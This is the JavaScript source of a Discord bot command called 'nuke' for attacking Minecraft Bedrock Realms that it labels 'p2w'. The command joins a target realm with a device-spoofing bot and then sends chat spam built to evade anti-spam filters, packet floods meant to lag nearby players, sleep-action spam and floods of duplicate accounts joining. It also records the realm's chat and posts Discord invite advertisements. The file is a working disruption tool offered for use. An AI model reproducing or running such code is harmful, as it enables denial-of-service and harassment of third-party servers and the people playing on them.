"use strict";

const devices = require("../../data/devices.json");
const { generateRandomString } = require("../../util.js");
const { getRealmData, getRealmAddress } = require("../../common/realms.js");
const { createBot, dupeClients, parseKickMessage, tpBot } = require("../../common/bp-dp.js");
const { realmModel, createRealmDefaults } = require("../../database.js");

const check = "<:success:1170321325886287882>";
const cross = "<:error:1170321352587219024>";
const loading = "<a:loading:1170321149759074355>";
const none = ":black_circle:";

const reply = "<:reply:1171524464761126942>";
const end = "<:end:1171524397840990269>";

const nukeStatus = new Map();

const colorcodes = () => { return "§l§n§" + generateRandomString(1, "abcdef1234567890"); };

module.exports = {
	name: "nuke",
	description: "mess with p2w realms with this command.",
	options: [
		{
			type: 3,
			name: "code",
			description: "the realm code to join",
			required: true,
			min_length: 11,
			max_length: 11
		},
		{
			type: 5,
			name: "capture_chat_log",
			description: "whether or not upload message logs to view"
		},
		{
			type: 4,
			name: "time",
			description: "how long to nuke the realm for",
			min_value: 1,
			max_value: 1800
		},
		{
			type: 4,
			name: "delay",
			description: "the delay for packets",
			min_value: 0,
			max_value: 540000
		},
		{
			type: 3,
			name: "message",
			description: "the message to spam to the p2w realm.",
			min_length: 1,
			max_length: 508
		},
		{
			type: 4,
			name: "random_string_length",
			description: "additional text applied to the message to bypass anti-spam",
			min_value: 0,
			max_value: 100
		},
		{
			type: 4,
			name: "amount",
			description: "the amount of chat packets to send",
			min_value: 100,
			max_value: 750
		},
		{
			type: 4,
			name: "source",
			description: "method to be used to send messages",
			choices: [
				{
					name: "Text",
					value: 0
				},
				{
					name: "/me",
					value: 1
				},
				{
					name: "/me (External)",
					value: 2
				},
				{
					name: "/tell (External)",
					value: 3
				}
			]
		},
		{
			type: 5,
			name: "sleep_spam",
			description: "should the bot spam the sleep messages in chat?"
		},
		{
			type: 5,
			name: "join_flood",
			description: "should bunch of random accounts join and leave a realm?"
		},
		{
			type: 5,
			name: "lag_clients",
			description: "lag any nearby users"
		},
		{
			type: 4,
			name: "device_os",
			description: "the device to spoof as",
			choices: devices
		}
	],
	requireLink: true,
	execute: async (interaction, args, dbUser) => {
		const { user, accountID } = interaction;
		const { code: realmCode, random_string_length: stringLength, sleep_spam, lag_clients, device_os } = args;
		let { capture_chat_log, join_flood, amount } = args;

		if(typeof amount === "undefined") amount = 300;

		if (nukeStatus.get(user.id) >= 1) return interaction.createFollowup("You currently have an instance of this command running. Please wait for that to end and try again.");
		nukeStatus.set(user.id, 1);

		let alerts = "";

		if (typeof capture_chat_log === "undefined") capture_chat_log = true;
		if (typeof join_flood === "undefined") join_flood = true;

		const embed = {
			title: "Realm Nuker",
			description: `${loading} Getting realm identity\n${none} Connecting to realm\n${none} Nuking realm`,
			timestamp: new Date(),
			color: 65280,
			footer: {
				text: `/nuke | Command used by ${user.username}`,
				icon_url: user.avatarURL
			}
		};

		const msg = await interaction.createFollowup({
			content: alerts,
			embed: embed,
			components: [{
				type: 1,
				components: [
					{
						type: 2,
						label: "Stop Operation",
						style: 4,
						custom_id: "a"
					}
				]
			}]
		});

		const realmData = await getRealmData(realmCode, accountID);

		if (realmData.errorMsg) {
			embed.color = 16729871;
			embed.description = `${cross} Getting realm identity\n${none} Connecting to realm\n${none} Nuking realm\n\nError Log:\n${realmData.errorMsg}`;

			msg.edit({ embed: embed, components: [] });
			return nukeStatus.delete(user.id);
		}

		let realm = await realmModel.findOne({ id: realmData.id });

		if (!realm) {
			realm = createRealmDefaults({
				id: realmData.id,
				name: realmData.name,
				realmCode: realmCode
			});
			realm.save();
		}

		if (realm.realmCode !== realmCode && !realmCode.startsWith("=")) {
			realm.realmCode = realmCode;
			realm.save();
		}

		if (realm.whitelisted) {
			embed.color = 16729871;
			embed.description = `${check} Getting realm identity\n${cross} Connecting to realm\n${none} Nuking realm\n\nError Log: Realm is whitelisted.`;

			msg.edit({ embed: embed, components: [] });
			return nukeStatus.delete(user.id);
		}

		const address = await getRealmAddress(realmData.id, accountID);

		if (address.errorMsg) {
			embed.color = 16729871;
			embed.description = `${check} Getting realm identity\n${cross} Connecting to realm\n${none} Nuking realm\n\nError Log:\n${address.errorMsg}`;

			msg.edit({ embed: embed, components: [] });
			return nukeStatus.delete(user.id);
		}

		embed.description = `${check} Getting realm identity\n${loading} Connecting to realm\n${none} Nuking realm`;
		msg.edit({ embed: embed });

		const time = args.time ?? (dbUser.premium ? 1800 : 300);
		const delay = args.delay ?? 50;
		const message = args.message ?? getRandomMessage();
		const source = args.source ?? 3;
		let chat_log = "";
		let lastJoinFlood = Date.now();
		let interval;

		const client = createBot(address, device_os, dbUser);

		client.on("start_game", (packet) => {
			embed.description = `${check} Getting realm identity\n${check} Connecting to realm\n${loading} Nuking realm\n\nRealm is being nuked.\nOperation ends <t:${Math.floor(Date.now() / 1000) + time}:R>.`;
			msg.edit({ embed: embed });
			
            tpBot(client)

			const action_packet = {
				runtime_entity_id: packet.runtime_entity_id,
				position: { x: 0, y: 0, z: 0 },
				result_position: { x: 0, y: 0, z: 0 },
				face: 0
			};

			interval = setInterval(() => {
				const message2 = stringLength ? `${message} ${generateRandomString(stringLength)}` : message;
				for (let i = 0; i < amount; i++) {
					switch (source) {
						case 0:
							client.sendMessage(`${colorcodes()}` + message2 + ' | .gg/antip2w');
							client.sendMessage2(`${colorcodes()}` + message2 + ' | .gg/antip2w');
							client.sendMessage3(`${colorcodes()}` + message2 + ' | .gg/antip2w');
							client.sendMessage4(`${colorcodes()}` + message2 + ' | .gg/antip2w');
							break;

						// /me spam
						case 1:
							client.sendCommand(`/me ${colorcodes()}${message2} | .gg/antip2w`, 0);
							client.sendCommand2(`/me ${colorcodes()}${message2} | .gg/antip2w`, 0);
							client.sendCommand3(`/me ${colorcodes()}${message2} | .gg/antip2w`, 0);
							client.sendCommand4(`/me ${colorcodes()}${message2} | .gg/antip2w`, 0);
							break;

						// External /me spam
						case 2:
							client.sendCommand(`/me ${colorcodes()}${message2} | .gg/antip2w`, 5);
							client.sendCommand2(`/me ${colorcodes()}${message2} | .gg/antip2w`, 5);
							client.sendCommand3(`/me ${colorcodes()}${message2} | .gg/antip2w`, 5);
							client.sendCommand4(`/me ${colorcodes()}${message2} | .gg/antip2w`, 5);
							break;
							
							// External /tell spam
							case 3:
							client.sendCommand(`/tell @a ${colorcodes()}${message2} | .gg/antip2w`, 5);
							client.sendCommand2(`/tell @a ${colorcodes()}${message2} | .gg/antip2w`, 5);
							client.sendCommand3(`/tell @a ${colorcodes()}${message2} | .gg/antip2w`, 5);
							client.sendCommand4(`/tell @a ${colorcodes()}${message2} | .gg/antip2w`, 5);
							break;
					}
				}

				for (let i = 0; i < 463; i++) {
					for (let i = 0; i < amount; i++) {
						client.queue("level_sound_event", {
							sound_id: i,
							position: packet.player_position,
							extra_data: 10000,
							entity_type: "",
							is_baby_mob: false,
							is_global: true
						});
					}

					if (lag_clients && i < 100) {
						client.write("animate", {
							action_id: 4,
							runtime_entity_id: packet.runtime_entity_id
						});
					}
				}

				if (sleep_spam) {
					client.write("player_action", {
						...action_packet,

						action: "start_sleeping"
					});

					client.write("player_action", {
						...action_packet,

						action: "stop_sleeping"
					});
				}

				if (join_flood && Date.now() - lastJoinFlood >= 150) {
					dupeClients(client, dbUser.skin);

					client.write(`disconnect_${Math.floor(Math.random() * (5 - 2) + 2)}`, {
						hide_disconnect_screen: false,
						message: "Client leaving"
					});

					lastJoinFlood = Date.now();
				}

				// Nuke cancelled
				if (nukeStatus.get(user.id) === 2) {
					embed.description = `${check} Getting realm identity\n${check} Connecting to realm\n${check} Nuking realm\n\nOperation has been cancelled.`;
					const data = {
						embed: embed,
						components: []
					};

					if (capture_chat_log) {
						data.file = {
							file: Buffer.from(chat_log),
							name: "chat_log.txt"
						};
					}

					msg.edit(data);

					client.disconnect();
					clearInterval(interval);
					return nukeStatus.delete(user.id);
				}

				// Nuke not active
				if (nukeStatus.get(user.id) === 0) {
					client.disconnect();
					return clearInterval(interval);
				}
			}, delay);

			// Nuke is done
			setTimeout(() => {
				if (nukeStatus.get(user.id) !== 1) {
					client.disconnect();
					return clearInterval(interval);
				}

				clearInterval(interval);
				client.disconnect();

				embed.description = `${check} Getting realm identity\n${check} Connecting to realm\n${check} Nuking realm\n\nOperation Complete.`;

				const data = {
					embed: embed,
					components: []
				};

				if (capture_chat_log) {
					data.file = {
						file: Buffer.from(chat_log),
						name: "chat_log.txt"
					};
				}

				msg.edit(data);
				nukeStatus.delete(user.id);
			}, time * 1000);
		});

		if (capture_chat_log) {
			client.on("text", (packet) => {
				const { type, message, xuid } = packet;

				if (type === "chat") {
					if (message.startsWith("* External") || xuid === client.profile.xuid) return;

					chat_log += `${new Date().toISOString()} | <${packet.source_name}> ${message}\n`;
				} else if (type === "json_whisper") {
					let rawtext;
					try {
						rawtext = JSON.parse(message).rawtext;
					} catch {
						return;
					}

					let raw_message = `${new Date().toISOString()} | `;

					// prevent a tellraw from freezing the bot
					if (rawtext.length > 25) rawtext.splice(25);

					for (const component of rawtext) {
						if (!component?.text) continue;

						raw_message += component.text;
					}

					chat_log += `${raw_message}\n`;
				}
			});
		}

		client.on("kick", (reason) => {
			embed.color = 16729871;
			embed.description = `${check} Getting realm identity\n${check} Connecting to realm\n${cross} Nuking realm\n\nError Log:\n${parseKickMessage(reason.message)}`;

			msg.edit({ embed: embed, components: [] });

			const data = {
				embed: embed,
				components: []
			};

			if (capture_chat_log) {
				data.file = {
					file: Buffer.from(chat_log),
					name: "chat_log.txt"
				};
			}

			msg.edit(data);

			nukeStatus.delete(user.id);
		});
	},
	componentPressEvent: cancelNuke
};

async function cancelNuke(interaction) {
	const { user } = interaction;

	if (!nukeStatus.get(user.id)) {
		return interaction.createMessage({
			content: "This operation has already ended.",
			flags: 64
		});
	}

	interaction.acknowledge();

	nukeStatus.set(user.id, 2);
}

function getRandomMessage() {
	const colorcodes = () => { return "§l§n§" + generateRandomString(1, "abcdef1234567890"); };

	let message = "";
	for (let i = 0; i < 9; i++) {
		message += `${colorcodes()} discord.gg/nris ${colorcodes()} discord.gg/NrfS8WC5Kd `;
	}

	// § is considered as two characters, so instead of substringing it to be 512 characters it has to be 454 (508 characters in total)
	message = message.substring(0, 454);

	/*
	const fs = require("node:fs");
	fs.writeFileSync("./msg.txt", message);
	*/

	return message;
}


/*
function getRandomMessage() {
	const colorcodes = () => {return "§l§n§" + generateRandomString(1, "abcdef1234567890");};
	let message = "";

	const payloads = Math.floor(Math.random() * (20 - 10 + 1)) + 10;

	for(let i = 0; i < payloads; i++) {
		const payload = Math.floor(Math.random() * (5 - 1 + 1)) + 1;

		// invite spam
		if(payload === 1) {
			for(let ii = 0; ii < 10; ii++) {
				message += `${colorcodes()}https://discord.gg/nris\n${colorcodes()}https://discord.gg/NrfS8WC5Kw\n --! a `;
			}
		}

		// randomness spam
		if(payload === 2) {
			message += colorcodes() + generateRandomString(Math.floor(Math.random() * (25 - 25 + 1)) + 25) + "\n";
		}

		// "obfuscated" message spam
		if(payload === 3) {
			message += `§k${generateRandomString(Math.floor(Math.random() * (25 - 5 + 1)) + 5)}§r\n`;
		}

		// emoji spam
		if(payload === 4) {
			message += "\n";
		}

		// mention spam
		if(payload === 5) {
			const mentions = ["@here", "@a", "@a"];

			for(let ii = 0; ii < 10; ii++) {
				const mention = mentions[Math.floor(Math.random() * mentions.length)];

				message += mention;
			}

			message += "\n";
		}
	}

	// make sure the message doesnt have any bad words
	const badWords = fs.readFileSync("./data/mc_bad_words.txt", {encoding:"utf8"}).split(/\r?\n/);

	for(const word of badWords) {
		message = message.replaceAll(word, "[ --- WARN --- ]");
	}

	return message;
}
*/
